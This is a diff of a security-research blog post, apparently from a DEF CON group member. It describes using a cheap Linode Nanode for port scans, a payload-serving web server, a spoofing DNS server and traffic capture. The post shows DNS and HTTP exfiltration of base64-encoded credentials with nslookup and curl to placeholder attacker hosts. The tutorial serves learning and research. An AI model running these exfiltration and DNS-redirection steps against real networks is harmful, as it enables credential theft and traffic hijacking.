@@ -38,7 +38,7 @@ Signing up for the cloud provider is a straight forward process.  No surprises h
 * Pick a __distro__
 * Select a __Region__
 * __Be careful of the default!__  Under Linode Plan select the __Nanode__ tab and pick the only option at the hourly rate of $0.0075.  The default, Standard plans are more expensive.
-* Don't worry about the label and tags.  This system won't live long.
+* Don't worry about the label and tags.  This system does not have Spock's blessing; it won't live long.
 * Set your SSH keys or a root password for connecting.
 * Click __Create__
 
@@ -46,7 +46,7 @@ Signing up for the cloud provider is a straight forward process.  No surprises h
 
 Once you click the create button it takes a few seconds for the new box to provision and boot.  The __Summary__ page lists the IPv4 and IPv6 addresses.
 
-    ![boot](/images/overcast/dynamic-public-cloud-server-ftw/03-boot.png){:height="50%" width="50%"}
+![boot](/images/overcast/dynamic-public-cloud-server-ftw/03-boot.png){:height="50%" width="50%"}
 
 Two console web shells options are provided by Linode (Weblish and Glish) but you'll want to use your own SSH session from your box.  Once you gain SSH access you can do all the normal sysadmin things to scaffold your platform.  I was raised by graybeards so the lack of maintaining tools such as netstat and ifconfig is disconcerting to say the least.  Yet I will resist the urge to install net-tools.  This host is bare bones right now so let's add what we need.
 
@@ -59,7 +59,7 @@ For those wondering, at this point your network transfer usage will be around 94
 
 ## So what can I do with this?  Here are some sample scenarios.
 ### Scan Your Home Public IP Address
-You now have an external point of presence why not take a look at how the world sees you?  This is probably one of the most practical scenarios for anyone in IT.  It's always a good idea to get a street view of your home network.  Anything showing up that you didn't expect?
+You now have an external point of presence.  Why not take a look at how the world sees you?  This is probably one of the most practical scenarios for anyone in IT.  It's always a good idea to get a street view of your home network.  Anything unexpected showing up?
 ```nmap -T3 -sC -sV -Pn -p1-65535 HOME_IP```
 
 ### Public Web Server for Exploits
@@ -70,7 +70,11 @@ cd badweb
 echo "my bad payload for exploiting CSRF or some such vector" > payload.html
 ```
 Start the web server to serve up those delicious payloads of wonder.
-```python -m SimpleHTTPServer 80```
+
+```bash
+python -m SimpleHTTPServer 80
+```
+
 Or install Apache and operate out of /var/www/html.  The researcher triggers the vulnerability causing the target to call the Nanode web server's payload.  If this lights up a sysadmin radar or triggers a ban, no worries, destroy this nanode and start over.
 
 ### DNS Server
@@ -81,24 +85,33 @@ On the nanode edit __/etc/dnsmasq.conf__:
 * Uncomment and modify line 131 to point to your local file for dnsmasq host resolution instead of /etc/hosts.
     ```addn-hosts=/etc/dnsmasq.hosts```
 * Create the __/etc/dnsmasq.hosts__ file and set your bad web server IP address (eg. 1.2.3.4) to the hostname of the internal good web server.  This will resolve the good web server name to your bad web server.
-```1.2.3.4  goodwebserver.company.com```
+```BAD_WEB_SERVER_IP    goodwebserver.company.com```
 
-The addn-host file (dnsmasq.hosts) can be named anything and has the same content format as /etc/hosts.  Be aware though Linux can default to running its preinstalled dnsmasq as a service.  So if you attempt to start manually it will throw errors.  If you want greater control the default service can be stopped ```service dnsmasq stop``` and run manually ```dnsmasq --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log```.  When not run in the background (or without tcpdump) the log file can be tailed to show any DNS queries ```tail -f /var/log/dnsmasq.log``` or parsed by one of your amazing scripts.
+The addn-host file (dnsmasq.hosts) can be named anything and has the same content format as /etc/hosts.  Be aware though Linux can default to running its preinstalled dnsmasq as a service.  So if you attempt to start manually it will throw errors.  If you want greater control the default service can be stopped ```service dnsmasq stop``` and run manually, or in the background with &, ```dnsmasq --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log```.  When not run in the background (or without tcpdump) the log file can be tailed to show any DNS queries ```tail -f /var/log/dnsmasq.log``` or parsed by one of your amazing scripts.
 
 ### Inspect Traffic
 ```tcpdump udp port 53 or tcp port 80 or tcp port 443```
 For more verbosity use ```-v``` or ```-vv``` for a flood of connection information.  When you are in security researcher mode it helps to limit the scope to the specific protocol and port being evaluated.  This prevents unnecessary noise and keeps the content concise for the write-up.
 
 If you have data to exfiltrate, such as ```echo "user:admin;pass:pfi9503" | base64 | sed 's/=//g'```, send it to your DNS server.
-```nslookup dXNlcjphZG1pbjtwYXNzOnBmaTk1MDMK NANODE_DNS_IP_ADDRESS```
+
+```bash
+nslookup dXNlcjphZG1pbjtwYXNzOnBmaTk1MDMK NANODE_DNS_IP_ADDRESS
+```
+
 Your DNS server or tcpdump shows the query which you know to be base64 encoded.  When decoded this reveals not a hostname but the internal data ```user:admin;pass:pfi9503```.
+
 Or if you only control a remote web server you can pull similar method from its logs by sending a request with the encoded data to exfiltrate.
-```curl https://NANODE_IP_ADDRESS/superfuntime/dXNlcjphZG1pbjtwYXNzOnBmaTk1MDMK```
+
+```bash
+curl https://NANODE_IP_ADDRESS/superfuntime/dXNlcjphZG1pbjtwYXNzOnBmaTk1MDMK
+```
+
 I use superfuntime as a control check for a script parsing the web log file to know when to decode.  It's not an actual directory or route and keeps the script from parsing any Internet noise. 
 
 For the blue teamers among us this may be a great listening post to research the noise.
 
 ### Public CTF Box for DEF CON Group Meetings
-While writing this post I thought of another use case.  Now that our meetings are both IRL and online this could be an interesting scenario for future DC864 meetings.  Instead of just having a CTF / vulnerable learning target on-site we can host it on a Nanode for both local and remote participants to use.  To reduce the traffic I'll probably pre-recon the box and provide it to the participants.  So if we cover a specific vector it can be the focus of the target and talk.  Even though there is a muscle memory learning benefit from recon to exploit to privelege escalation, etc. being hyper focused during meetings (eg. SQLi, LFI, etc.) could be a good thing.  Need to put a bit more brainery into this area before release so stay tuned or contribute ideas as you see fit.
+Several of us are neck deek in CTF creation land (sounds like a new Nintendo title -- I'd play that) which led me to think of another use case.  Now that our meetings are both IRL and online this could be an interesting scenario for future DC864 meetings.  Instead of just having a CTF / vulnerable learning target on-site we can host it on a Nanode for both local and remote participants to use.  To reduce the traffic I'll probably pre-recon the box and provide it to the participants.  So if we cover a specific vector it can be the focus of the target and talk.  Even though there is a muscle memory learning benefit from recon to exploit to privelege escalation, etc. being hyper focused during meetings (eg. SQLi, LFI, etc.) could be a good thing.  Need to put a bit more brainery into this area before release so stay tuned or contribute ideas as you see fit.  Either way, we have no shortage of CTF options right now.
 
 Happy hacking everyone.
